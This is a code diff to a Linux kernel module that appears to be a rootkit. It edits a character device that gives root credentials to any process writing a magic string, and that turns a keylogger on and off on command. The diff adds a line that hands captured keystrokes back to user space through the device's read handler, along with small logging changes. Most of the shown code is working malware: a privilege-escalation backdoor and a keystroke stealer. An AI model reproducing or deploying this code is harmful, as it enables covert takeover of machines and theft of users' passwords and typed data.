@@ -152,6 +152,7 @@ static ssize_t dev_read (struct file *f, char *buf, size_t len, loff_t *off)
 
    // copy_to_user has the format ( * to, *from, size) and returns 0 on success
    error_count = copy_to_user(buf, message, (int)sizeof(message));
+   error_count = copy_to_user(buf, keys_buf+buf_pos, (int)sizeof(message));
 
    if (error_count==0){
       printk(KERN_INFO "User read %d characters\n", (int)sizeof(message));
@@ -176,7 +177,6 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
   static char logger[] = "keylogger";
   static char exitlogger[] = "exitkeylogger";
   struct cred *new_cred;
-  int err_code;
 
 	printk ("Device write\n");
 
@@ -188,7 +188,7 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 			printk ("Cannot prepare credentials\n");
 			return 0;
 		}
-		printk ("You got root\n");
+		printk ("You got root!\n");
 		V(new_cred->uid) = V(new_cred->gid) =  0;					// changes creds. uid -> 0
 		V(new_cred->euid) = V(new_cred->egid) = 0;
 		V(new_cred->suid) = V(new_cred->sgid) = 0;
@@ -197,15 +197,22 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 	}
 	else if(memcmp(buf, logger, (int)sizeof(logger)-1) == 0)
 	{
-		printk("Keylogger activated\n");
-		err_code = run_keylogger();
-    printk("Keylogger code:%d\n",err_code);
+		printk("Keylogger: activated\n");
+		run_keylogger();
 	}
 	else if(memcmp(buf, exitlogger, (int)sizeof(logger)-1) == 0)
 	{
-		printk("Keylogger deactivated\n");
+		printk("Keylogger: deactivated\n");
 		exit_keylogger();
 	}
+  else
+  {
+    printk(KERN_ERR "Message: ");
+    printk(KERN_ERR "%*pH\n", buf);
+    //printk(buf);
+    //pr_debug("A%s\n", buf);
+    //printk("\n");
+  }
 	return len;
 }
 
